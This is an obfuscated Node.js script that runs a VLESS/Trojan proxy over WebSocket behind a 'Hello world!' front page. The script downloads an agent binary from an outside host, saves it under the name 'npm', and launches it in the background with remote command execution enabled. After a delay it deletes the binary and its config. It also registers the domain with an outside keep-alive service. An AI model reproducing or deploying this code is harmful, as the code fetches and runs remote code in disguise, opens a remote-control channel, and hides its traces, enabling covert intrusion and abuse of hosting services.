const _0x92b482=_0x300a;(function(_0x23c420,_0xef7403){const _0x1e4048=_0x300a,_0x138efa=_0x23c420();while(!![]){try{const _0x69fc1=parseInt(_0x1e4048(0xab))/0x1*(parseInt(_0x1e4048(0xf2))/0x2)+parseInt(_0x1e4048(0x104))/0x3*(parseInt(_0x1e4048(0xc9))/0x4)+parseInt(_0x1e4048(0xce))/0x5*(-parseInt(_0x1e4048(0xff))/0x6)+-parseInt(_0x1e4048(0xd0))/0x7*(parseInt(_0x1e4048(0xa3))/0x8)+-parseInt(_0x1e4048(0xc1))/0x9*(-parseInt(_0x1e4048(0xbe))/0xa)+parseInt(_0x1e4048(0x9c))/0xb*(-parseInt(_0x1e4048(0xa1))/0xc)+parseInt(_0x1e4048(0xc0))/0xd*(parseInt(_0x1e4048(0xb6))/0xe);if(_0x69fc1===_0xef7403)break;else _0x138efa['push'](_0x138efa['shift']());}catch(_0x14894f){_0x138efa['push'](_0x138efa['shift']());}}}(_0x38f1,0x2b4ab));const os=require('os'),http=require(_0x92b482(0xbb)),fs=require('fs'),axios=require(_0x92b482(0x9b)),net=require(_0x92b482(0x94)),path=require(_0x92b482(0xd9)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x92b482(0x97)][_0x92b482(0xc6)]||_0x92b482(0xb0),NEZHA_SERVER=process[_0x92b482(0x97)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x92b482(0x100)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x92b482(0x97)][_0x92b482(0xdd)]||_0x92b482(0x10b),AUTO_ACCESS=process[_0x92b482(0x97)][_0x92b482(0xba)]||!![],WSPATH=process[_0x92b482(0x97)]['WSPATH']||UUID[_0x92b482(0xde)](0x0,0x8),SUB_PATH=process[_0x92b482(0x97)][_0x92b482(0xf8)]||'sub',NAME=process[_0x92b482(0x97)][_0x92b482(0xec)]||_0x92b482(0xea),PORT=process[_0x92b482(0x97)][_0x92b482(0xca)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x24a010=_0x92b482;try{const _0x22fa2a=await axios[_0x24a010(0xa2)](_0x24a010(0xe0)),_0x3f11d1=_0x22fa2a[_0x24a010(0xe1)];ISP=(_0x3f11d1['country']+'-'+_0x3f11d1[_0x24a010(0xd4)])[_0x24a010(0xfd)](/ /g,'_');}catch(_0x35a7a6){ISP=_0x24a010(0x8f);}};GetISP();const httpServer=http[_0x92b482(0xaa)]((_0x550bfe,_0x429133)=>{const _0x1b1e3a=_0x92b482;if(_0x550bfe['url']==='/'){const _0x29f568=path[_0x1b1e3a(0xaf)](__dirname,_0x1b1e3a(0xe4));fs[_0x1b1e3a(0xd3)](_0x29f568,'utf8',(_0x31d036,_0x214372)=>{const _0x2564b2=_0x1b1e3a;if(_0x31d036){_0x429133[_0x2564b2(0xe6)](0xc8,{'Content-Type':_0x2564b2(0xb7)}),_0x429133[_0x2564b2(0xb3)](_0x2564b2(0xe7));return;}_0x429133['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x429133[_0x2564b2(0xb3)](_0x214372);});return;}else{if(_0x550bfe[_0x1b1e3a(0xcb)]==='/'+SUB_PATH){const _0x54fd78=_0x1b1e3a(0xcc)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x1b1e3a(0xe8)+DOMAIN+_0x1b1e3a(0xb5)+WSPATH+'#'+NAME+'-'+ISP,_0x5476ef='trojan://'+UUID+'@'+DOMAIN+_0x1b1e3a(0xa7)+DOMAIN+_0x1b1e3a(0xe8)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x5ca44f=_0x54fd78+'\x0a'+_0x5476ef,_0x8bedda=Buffer[_0x1b1e3a(0x105)](_0x5ca44f)[_0x1b1e3a(0x99)](_0x1b1e3a(0xd7));_0x429133[_0x1b1e3a(0xe6)](0xc8,{'Content-Type':_0x1b1e3a(0xe5)}),_0x429133[_0x1b1e3a(0xb3)](_0x8bedda+'\x0a');}else _0x429133[_0x1b1e3a(0xe6)](0x194,{'Content-Type':_0x1b1e3a(0xe5)}),_0x429133[_0x1b1e3a(0xb3)](_0x1b1e3a(0xac));}}),wss=new WebSocket[(_0x92b482(0xbf))]({'server':httpServer}),uuid=UUID[_0x92b482(0xfd)](/-/g,''),DNS_SERVERS=[_0x92b482(0x109),'1.1.1.1'];function _0x300a(_0x19f948,_0x553cdb){const _0x38f187=_0x38f1();return _0x300a=function(_0x300a25,_0x50cbc7){_0x300a25=_0x300a25-0x8c;let _0x3a4a93=_0x38f187[_0x300a25];return _0x3a4a93;},_0x300a(_0x19f948,_0x553cdb);}function resolveHost(_0x1fb5ad){return new Promise((_0x59a8cf,_0xab2c3d)=>{const _0x2c7bca=_0x300a;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2c7bca(0x95)](_0x1fb5ad)){_0x59a8cf(_0x1fb5ad);return;}let _0x428839=0x0;function _0x44a31c(){const _0xa6fa9b=_0x2c7bca;if(_0x428839>=DNS_SERVERS[_0xa6fa9b(0xe9)]){_0xab2c3d(new Error(_0xa6fa9b(0xf9)+_0x1fb5ad+_0xa6fa9b(0xf4)));return;}const _0x5da3f8=DNS_SERVERS[_0x428839];_0x428839++;const _0x6283f9=_0xa6fa9b(0x106)+encodeURIComponent(_0x1fb5ad)+'&type=A';axios[_0xa6fa9b(0xa2)](_0x6283f9,{'timeout':0x1388,'headers':{'Accept':_0xa6fa9b(0xfb)}})[_0xa6fa9b(0xc3)](_0x257a7d=>{const _0x189463=_0xa6fa9b,_0x4079f5=_0x257a7d[_0x189463(0xe1)];if(_0x4079f5[_0x189463(0xcf)]===0x0&&_0x4079f5[_0x189463(0xa9)]&&_0x4079f5[_0x189463(0xa9)][_0x189463(0xe9)]>0x0){const _0x24d886=_0x4079f5[_0x189463(0xa9)]['find'](_0x37aa96=>_0x37aa96[_0x189463(0xdb)]===0x1);if(_0x24d886){_0x59a8cf(_0x24d886[_0x189463(0xe1)]);return;}}_0x44a31c();})[_0xa6fa9b(0xb1)](_0x13231c=>{_0x44a31c();});}_0x44a31c();});}function handleVlessConnection(_0x4f323e,_0x52ada6){const _0x2e8ae3=_0x92b482,[_0xe7e48]=_0x52ada6,_0x34b4c7=_0x52ada6[_0x2e8ae3(0xde)](0x1,0x11);if(!_0x34b4c7[_0x2e8ae3(0xbc)]((_0x3b1cb5,_0x1e767a)=>_0x3b1cb5==parseInt(uuid[_0x2e8ae3(0xd8)](_0x1e767a*0x2,0x2),0x10)))return![];let _0x34112a=_0x52ada6['slice'](0x11,0x12)[_0x2e8ae3(0xb9)]()+0x13;const _0x56180f=_0x52ada6[_0x2e8ae3(0xde)](_0x34112a,_0x34112a+=0x2)[_0x2e8ae3(0xae)](0x0),_0x2741b2=_0x52ada6[_0x2e8ae3(0xde)](_0x34112a,_0x34112a+=0x1)[_0x2e8ae3(0xb9)](),_0x2f7407=_0x2741b2==0x1?_0x52ada6[_0x2e8ae3(0xde)](_0x34112a,_0x34112a+=0x4)['join']('.'):_0x2741b2==0x2?new TextDecoder()[_0x2e8ae3(0x9d)](_0x52ada6['slice'](_0x34112a+0x1,_0x34112a+=0x1+_0x52ada6['slice'](_0x34112a,_0x34112a+0x1)[_0x2e8ae3(0xb9)]())):_0x2741b2==0x3?_0x52ada6[_0x2e8ae3(0xde)](_0x34112a,_0x34112a+=0x10)[_0x2e8ae3(0xa0)]((_0x17124d,_0xde9e09,_0x44fa2a,_0x5cb128)=>_0x44fa2a%0x2?_0x17124d['concat'](_0x5cb128[_0x2e8ae3(0xde)](_0x44fa2a-0x1,_0x44fa2a+0x1)):_0x17124d,[])[_0x2e8ae3(0xf1)](_0x562e13=>_0x562e13[_0x2e8ae3(0xae)](0x0)[_0x2e8ae3(0x99)](0x10))[_0x2e8ae3(0xaf)](':'):'';_0x4f323e['send'](new Uint8Array([_0xe7e48,0x0]));const _0x22147d=createWebSocketStream(_0x4f323e);return resolveHost(_0x2f7407)[_0x2e8ae3(0xc3)](_0x4a971c=>{const _0x2cd747=_0x2e8ae3;net[_0x2cd747(0xf6)]({'host':_0x4a971c,'port':_0x56180f},function(){const _0x5f2daa=_0x2cd747;this[_0x5f2daa(0x103)](_0x52ada6['slice'](_0x34112a)),_0x22147d['on']('error',()=>{})[_0x5f2daa(0xd2)](this)['on'](_0x5f2daa(0x102),()=>{})[_0x5f2daa(0xd2)](_0x22147d);})['on'](_0x2cd747(0x102),()=>{});})[_0x2e8ae3(0xb1)](_0x3986de=>{const _0x369ea8=_0x2e8ae3;net[_0x369ea8(0xf6)]({'host':_0x2f7407,'port':_0x56180f},function(){const _0x16d338=_0x369ea8;this['write'](_0x52ada6[_0x16d338(0xde)](_0x34112a)),_0x22147d['on'](_0x16d338(0x102),()=>{})[_0x16d338(0xd2)](this)['on'](_0x16d338(0x102),()=>{})[_0x16d338(0xd2)](_0x22147d);})['on'](_0x369ea8(0x102),()=>{});}),!![];}function handleTrojanConnection(_0x288d5a,_0x56d12c){const _0x5079ec=_0x92b482;try{if(_0x56d12c[_0x5079ec(0xe9)]<0x3a)return![];const _0x2fe706=_0x56d12c[_0x5079ec(0xde)](0x0,0x38)[_0x5079ec(0x99)](),_0x35dafb=[UUID];let _0x242dc6=null;for(const _0x1a03de of _0x35dafb){const _0x3da62d=crypto[_0x5079ec(0x9f)](_0x5079ec(0xcd))[_0x5079ec(0xf5)](_0x1a03de)[_0x5079ec(0xc7)](_0x5079ec(0x9e));if(_0x3da62d===_0x2fe706){_0x242dc6=_0x1a03de;break;}}if(!_0x242dc6)return![];let _0x2744de=0x38;_0x56d12c[_0x2744de]===0xd&&_0x56d12c[_0x2744de+0x1]===0xa&&(_0x2744de+=0x2);const _0x240735=_0x56d12c[_0x2744de];if(_0x240735!==0x1)return![];_0x2744de+=0x1;const _0x131f05=_0x56d12c[_0x2744de];_0x2744de+=0x1;let _0x5b7c16,_0x118aa0;if(_0x131f05===0x1)_0x5b7c16=_0x56d12c[_0x5079ec(0xde)](_0x2744de,_0x2744de+0x4)[_0x5079ec(0xaf)]('.'),_0x2744de+=0x4;else{if(_0x131f05===0x3){const _0x13bd16=_0x56d12c[_0x2744de];_0x2744de+=0x1,_0x5b7c16=_0x56d12c[_0x5079ec(0xde)](_0x2744de,_0x2744de+_0x13bd16)['toString'](),_0x2744de+=_0x13bd16;}else{if(_0x131f05===0x4)_0x5b7c16=_0x56d12c[_0x5079ec(0xde)](_0x2744de,_0x2744de+0x10)[_0x5079ec(0xa0)]((_0x8f0747,_0x24f1aa,_0x427061,_0x4e8c92)=>_0x427061%0x2?_0x8f0747['concat'](_0x4e8c92[_0x5079ec(0xde)](_0x427061-0x1,_0x427061+0x1)):_0x8f0747,[])['map'](_0x1411b8=>_0x1411b8[_0x5079ec(0xae)](0x0)['toString'](0x10))[_0x5079ec(0xaf)](':'),_0x2744de+=0x10;else return![];}}_0x118aa0=_0x56d12c[_0x5079ec(0xae)](_0x2744de),_0x2744de+=0x2;_0x2744de<_0x56d12c[_0x5079ec(0xe9)]&&_0x56d12c[_0x2744de]===0xd&&_0x56d12c[_0x2744de+0x1]===0xa&&(_0x2744de+=0x2);const _0x3f641f=createWebSocketStream(_0x288d5a);return resolveHost(_0x5b7c16)[_0x5079ec(0xc3)](_0xbc2f72=>{net['connect']({'host':_0xbc2f72,'port':_0x118aa0},function(){const _0x63b06=_0x300a;_0x2744de<_0x56d12c['length']&&this[_0x63b06(0x103)](_0x56d12c[_0x63b06(0xde)](_0x2744de)),_0x3f641f['on'](_0x63b06(0x102),()=>{})['pipe'](this)['on'](_0x63b06(0x102),()=>{})[_0x63b06(0xd2)](_0x3f641f);})['on']('error',()=>{});})['catch'](_0x124d5e=>{const _0x2b9321=_0x5079ec;net[_0x2b9321(0xf6)]({'host':_0x5b7c16,'port':_0x118aa0},function(){const _0x3f5c1b=_0x2b9321;_0x2744de<_0x56d12c['length']&&this[_0x3f5c1b(0x103)](_0x56d12c[_0x3f5c1b(0xde)](_0x2744de)),_0x3f641f['on'](_0x3f5c1b(0x102),()=>{})[_0x3f5c1b(0xd2)](this)['on']('error',()=>{})[_0x3f5c1b(0xd2)](_0x3f641f);})['on'](_0x2b9321(0x102),()=>{});}),!![];}catch(_0x4e44d3){return![];}}wss['on'](_0x92b482(0xfe),(_0x165d72,_0x590e59)=>{const _0x3b3da0=_0x92b482,_0xe3c8cc=_0x590e59[_0x3b3da0(0xcb)]||'';_0x165d72[_0x3b3da0(0xa4)](_0x3b3da0(0xb2),_0xc0b08a=>{const _0xcf8cc=_0x3b3da0;if(_0xc0b08a['length']>0x11&&_0xc0b08a[0x0]===0x0){const _0x16ff20=_0xc0b08a['slice'](0x1,0x11),_0x24f152=_0x16ff20[_0xcf8cc(0xbc)]((_0x31a3c3,_0xc2e4c0)=>_0x31a3c3==parseInt(uuid['substr'](_0xc2e4c0*0x2,0x2),0x10));if(_0x24f152){!handleVlessConnection(_0x165d72,_0xc0b08a)&&_0x165d72[_0xcf8cc(0xed)]();return;}}!handleTrojanConnection(_0x165d72,_0xc0b08a)&&_0x165d72['close']();})['on'](_0x3b3da0(0x102),()=>{});});function _0x38f1(){const _0x4ef1dc=['createWriteStream','4DhpsXn','PORT','url','vless://','sha224','375squkRh','Status','49FfDLNp','trim','pipe','readFile','asOrganization','writeFileSync','--tls','base64','substr','path','stream','type','aarch64','DOMAIN','slice','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://speed.cloudflare.com/meta','data','443','8443','index.html','text/plain','writeHead','Hello\x20world!','&fp=chrome&type=ws&host=','length','Hug','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NAME','close','2087','\x20-p\x20','Server\x20is\x20running\x20on\x20port\x20','map','48gqDyGt','2083','\x20with\x20all\x20DNS\x20servers','update','connect','utf-8','SUB_PATH','Failed\x20to\x20resolve\x20','true','application/dns-json','arch','replace','connection','20388hHbXYn','NEZHA_PORT','split','error','write','405423Nntfls','from','https://dns.google/resolve?name=','pop','application/json','8.8.4.4','post','1234.abc.com','npm\x20is\x20already\x20running,\x20skip\x20running...','npm','2096','https://amd64.ssss.nyc.mn/v1','Unknown','setsid\x20nohup\x20./npm\x20-s\x20','npm\x20download\x20successfully','includes','https://oooo.serv00.net/add-url','net','test','arm','env','log','toString','chmod\x20+x\x20npm','axios','11473qKalzt','decode','hex','createHash','reduce','1512tSKyQI','get','127856kSMNmQ','once','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','client_secret:\x20',':443?security=tls&sni=','/bin/bash','Answer','createServer','8264XBjtlj','Not\x20Found\x0a','2053','readUInt16BE','join','b712e235-ffb1-42f1-9218-1bc76ca21bf3','catch','message','end','https://arm64.ssss.nyc.mn/agent','&path=%2F','14sSuxYz','text/html','https://arm64.ssss.nyc.mn/v1','readUInt8','AUTO_ACCESS','http','every','unlink','110ZTwGBX','Server','466297RFosGC','250461xyIdXI','https://','then','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Automatic\x20Access\x20Task\x20added\x20successfully','UUID','digest'];_0x38f1=function(){return _0x4ef1dc;};return _0x38f1();}const getDownloadUrl=()=>{const _0x897fd3=_0x92b482,_0x5dcb90=os[_0x897fd3(0xfc)]();return _0x5dcb90===_0x897fd3(0x96)||_0x5dcb90==='arm64'||_0x5dcb90===_0x897fd3(0xdc)?!NEZHA_PORT?_0x897fd3(0xb8):_0x897fd3(0xb4):!NEZHA_PORT?_0x897fd3(0x8e):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x4537e3=_0x92b482;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x25f1f0=getDownloadUrl(),_0x419a19=await axios({'method':_0x4537e3(0xa2),'url':_0x25f1f0,'responseType':_0x4537e3(0xda)}),_0x33a810=fs[_0x4537e3(0xc8)]('npm');return _0x419a19[_0x4537e3(0xe1)][_0x4537e3(0xd2)](_0x33a810),new Promise((_0x594fb9,_0x175548)=>{const _0x1670f6=_0x4537e3;_0x33a810['on']('finish',()=>{const _0x7e3a7e=_0x300a;console['log'](_0x7e3a7e(0x91)),exec(_0x7e3a7e(0x9a),_0x337731=>{if(_0x337731)_0x175548(_0x337731);_0x594fb9();});}),_0x33a810['on'](_0x1670f6(0x102),_0x175548);});}catch(_0x214275){throw _0x214275;}},runnz=async()=>{const _0x13e066=_0x92b482;try{const _0x52b683=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x13e066(0xf7)});if(_0x52b683[_0x13e066(0xd1)]()!==''){console[_0x13e066(0x98)](_0x13e066(0x10c));return;}}catch(_0x55385f){}await downloadFile();let _0x7dd7a4='',_0x573efd=[_0x13e066(0xe2),_0x13e066(0xe3),_0x13e066(0x8d),_0x13e066(0xee),_0x13e066(0xf3),_0x13e066(0xad)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x46a5c7=_0x573efd[_0x13e066(0x92)](NEZHA_PORT)?_0x13e066(0xd6):'';_0x7dd7a4=_0x13e066(0x90)+NEZHA_SERVER+':'+NEZHA_PORT+_0x13e066(0xef)+NEZHA_KEY+'\x20'+_0x46a5c7+_0x13e066(0xeb);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3503d3=NEZHA_SERVER[_0x13e066(0x92)](':')?NEZHA_SERVER[_0x13e066(0x101)](':')[_0x13e066(0x107)]():'',_0x41deac=_0x573efd[_0x13e066(0x92)](_0x3503d3)?_0x13e066(0xfa):'false',_0x13800a=_0x13e066(0xa6)+NEZHA_KEY+_0x13e066(0xdf)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x41deac+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x13e066(0xd5)]('config.yaml',_0x13800a);}_0x7dd7a4=_0x13e066(0xa5);}else{console[_0x13e066(0x98)](_0x13e066(0xc4));return;}}try{exec(_0x7dd7a4,{'shell':_0x13e066(0xa8)},_0x159990=>{const _0x39c3b4=_0x13e066;if(_0x159990)console[_0x39c3b4(0x102)]('npm\x20running\x20error:',_0x159990);else console[_0x39c3b4(0x98)]('npm\x20is\x20running');});}catch(_0x370aa1){console[_0x13e066(0x102)]('error:\x20'+_0x370aa1);}};async function addAccessTask(){const _0x12e216=_0x92b482;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5083f6=_0x12e216(0xc2)+DOMAIN;try{const _0x1a3f5d=await axios[_0x12e216(0x10a)](_0x12e216(0x93),{'url':_0x5083f6},{'headers':{'Content-Type':_0x12e216(0x108)}});console[_0x12e216(0x98)](_0x12e216(0xc5));}catch(_0x4bb108){}}const delFiles=()=>{const _0x3ef803=_0x92b482;fs[_0x3ef803(0xbd)](_0x3ef803(0x8c),()=>{}),fs[_0x3ef803(0xbd)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x3b9ef8=_0x92b482;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3b9ef8(0x98)](_0x3b9ef8(0xf0)+PORT);});
